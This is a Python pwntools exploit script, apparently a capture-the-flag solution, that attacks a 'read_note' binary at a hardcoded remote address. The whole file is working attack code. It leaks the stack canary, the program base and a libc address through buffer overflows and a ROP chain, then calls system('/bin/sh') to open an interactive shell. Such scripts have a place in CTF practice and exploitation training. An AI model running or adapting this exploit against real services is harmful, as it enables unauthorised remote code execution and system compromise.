from pwn import *
from LibcSearcher import LibcSearcher

context(arch='amd64', os='linux', log_level = 'DEBUG')

#p = process('./read_note')
p = remote('114.116.54.89',10000)
elf = ELF('./read_note')

def ret2main():
	payload = flat('a'*600,canary,'a'*8,'\x20')
	p.sendafter('624)\n', payload)

def send(payload):
	p.sendlineafter('path:\n','flag')
	p.sendlineafter('len:\n','999')
	p.sendlineafter('note:\n',payload)
	p.recvuntil('aaaa\n')

def ret2libc(leak, func):
	libc = LibcSearcher(func, leak)

	base = leak - libc.dump(func)
	system = base + libc.dump('system')
	binsh = base + libc.dump('str_bin_sh')
	return (system, binsh)

# leak canary
send('a'*600)
canary = u64('\x00' + p.recv(7))
log.success('canary:' + hex(canary))
ret2main()

# leak elf base
send('a'*615)
base = u64(p.recv(6).ljust(8,'\x00')) - 0xd2e
log.success('base: ' + hex(base))
ret2main()

# leak libc
pop_rdi = 0xe03
main = 0xd20
payload = flat(['a'*600,canary,'a'*8,base+pop_rdi,base+elf.got['read'],base+elf.plt['puts'],base+main])
send(payload)

payload = flat('a'*600,canary,'a'*8,base+pop_rdi)
p.recvuntil('624)\n')
p.send(payload)
read = u64(p.recv(6).ljust(8,'\x00'))
log.success('read: ' + hex(read))
system, binsh = ret2libc(read, 'read')

# get shell
payload = flat('a'*600,canary,'a'*8,base+pop_rdi,binsh,system)
send(payload)
p.sendlineafter('624)\n','a')

p.interactive()